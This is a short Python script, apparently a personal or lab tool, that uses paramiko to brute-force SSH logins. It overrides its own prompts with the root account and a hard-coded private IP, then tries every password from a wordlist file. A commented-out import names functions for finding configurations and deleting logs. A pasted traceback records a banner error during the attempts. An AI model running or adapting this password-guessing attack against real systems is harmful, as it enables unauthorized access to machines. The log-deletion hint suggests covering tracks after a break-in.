#NOTE: ACTUAL CODE FROM STEFAN HIEBL

import paramiko, os, sys

def SSH(ip,username,password,port,timeout):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, username=username, password=password)

ip = input("Please input the ip that you would like to connect to: ")
ip = '10.11.2.110'
username = input("Please input the username: ")
# username = 'helpdesk'
username = 'root'
# password = input("Please input the password: ")
fname = input("Please specify the password_list_file: ")
fname = 'passwords.txt'
port = input("On what port would you like to connect? (Default: 22): ")
timeout = input("What would you like the timeout for the TCP connection be? (Default: 5 sec):")

if port == "":
    port = "22"

if username == "":
    username = "stefanh"

'''
if password == "":
    password = "admin"
'''

if timeout == "":
    timeout = "5"
    # timeout = "10"

print(port)
print(username)
# print(password)

password_list_file = open(fname,"r")
password_list = password_list_file.read().split("\n")
print(password_list)
password_list_file.close()

for password in password_list:
    print("Trying password: ", password)
    try:
        SSH(ip,username,password,port,timeout)
        # time.sleep(5)
        print("Connection successful!")
        # from Configuration_Check import FIND_CONFIGS,DELETE_LOGS
        break
    except:
        print("Connection failed.")


'''
# TO DO:
# Fix error:
Trying password:  monkey
Exception: Error reading SSH protocol banner
Traceback (most recent call last):
  File "/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/paramiko/transport.py", line 2044, in _check_banner
    buf = self.packetizer.readline(timeout)
  File "/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/paramiko/packet.py", line 353, in readline
    buf += self._read_timeout(timeout)
  File "/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/paramiko/packet.py", line 542, in _read_timeout
    raise EOFError()
EOFError

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/paramiko/transport.py", line 1893, in run
    self._check_banner()
  File "/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/paramiko/transport.py", line 2049, in _check_banner
    'Error reading SSH protocol banner' + str(e)
paramiko.ssh_exception.SSHException: Error reading SSH protocol banner

Connection failed.
'''
